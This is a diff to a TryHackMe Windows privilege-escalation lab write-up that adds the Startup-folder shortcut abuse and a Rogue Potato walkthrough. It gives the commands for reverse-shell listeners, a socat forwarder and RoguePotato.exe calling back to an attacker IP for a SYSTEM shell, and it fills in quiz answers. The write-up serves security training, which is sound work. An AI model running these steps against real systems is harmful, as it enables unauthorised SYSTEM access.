@@ -535,25 +535,95 @@ file:\C:\Windows\system32\cmd.exe
 
 ### Startup Apps
 
+In this task we will utilize the priveleges given to startup apps when run from an admin account.
 
+*Read and follow along with the above.*
 
-Read and follow along with the above. 
+We are first going to check the permissions we have for the startup folder using `accesschk.exe`.
+
+```cmd
+C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+```
+
+![Checking Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Startup_Permissions.png)
+
+Looks like we have write permissions. Now we use the provided script and our uploaded reverse shell to create a startup shortcut to our reverse shell with admin priveleges.
+
+```cmd
+cscript C:\PrivEsc\CreateShortcut.vbs
+```
+
+![Create Shortcut](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Startup_Shortcut.png)
+
+Then we set up a listener on our machine:
+
+```cmd
+nc -nlvp 1337
+```
+
+Lastly, we log into the target machine with our admin credentials to simulate an admin logon. I am using Reminna for this, but you can also use `rdesktop`.
+
+![Admin Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Startup_Admin_Shell.png)
+
+```cmd
+rdesktop -u admin 10.10.20.33
+```
 
 ### Token Impersonation - Rogue Potato
 
+In this task we will use the RoguePotato exploit to gain a SYSTEM shell.
 
+We must first set up a forwarder on our attack machine using `socat`.
+
+```cmd
+sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.20.33:9999
+```
+
+![Socat Forwarder](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Rogue_Potato_Socat.png)
+
+We then log into the machine with an admin account to simulate a Service account. We can create this by using:
+
+```cmd
+C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+```
+
+![Create Service Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Rogue_Potato_Create_Service_Shell.png)
+
+Before that, we must set up a listener on our machine.
+
+```cmd
+nc -nlvp 1337
+```
+
+![Service Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Rogue_Potato_Service_Connection.png)
+
+In this shell we can now use the RoguePotato exploit to gain a SYSTEM shell.
+
+```cmd
+C:\PrivEsc\RoguePotato.exe -r 10.18.78.136 -e "C:\PrivEsc\reverse.exe" -l 9999
+```
+
+![Create System Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Rogue_Potato_Create_System_Shell.png)
+
+Again, set up a listener before executing that command:
+
+```cmd
+nc -nlvp 1337
+```
+
+![System Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Rogue_Potato_System_Shell.png)
 
 1. Name one user privilege that allows this exploit to work.
 
+   I found this information on the following [site](https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html). Otherwise, just Google it.
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>SeImpersonatePrivilege</details>
 
 2. Name the other user privilege that allows this exploit to work.
 
-   
+   Same as the previous question.
 
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>SeAssignPrimaryTokenPrivilege</details>
 
 ### Token Impersonation - PrintSpoofer
 
